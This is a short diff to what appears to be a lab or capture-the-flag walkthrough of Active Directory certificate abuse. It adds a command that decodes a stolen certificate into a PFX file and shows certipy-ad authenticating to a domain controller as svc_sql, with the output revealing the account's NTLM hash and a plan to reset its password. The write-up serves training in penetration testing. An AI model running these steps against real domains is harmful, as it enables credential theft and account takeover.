@@ -638,8 +638,10 @@ So now dc02 is accessible i can use the pfx
 So first ill make sure the cert is all on one line (sometimes formatting puts it on multiple), then copy the pfx given from certify and put it in a file called cert.txt
 
 ```python
-
+cat cert.txt | base64 -d | tee svc_sql.pfx
 ```
+
+Then ill put it in a PFX by decoding it and placing it in the correct file
 
 ```python
 certipy-ad auth -pfx svc_sql.pfx -dc-ip 172.16.20.2 -username svc_sql -domain darkzero.ext -debug
@@ -671,3 +673,4 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f
 ```
 
+Now i have the NTLM and a TGT for the user, so now i should be able to change the password for the user
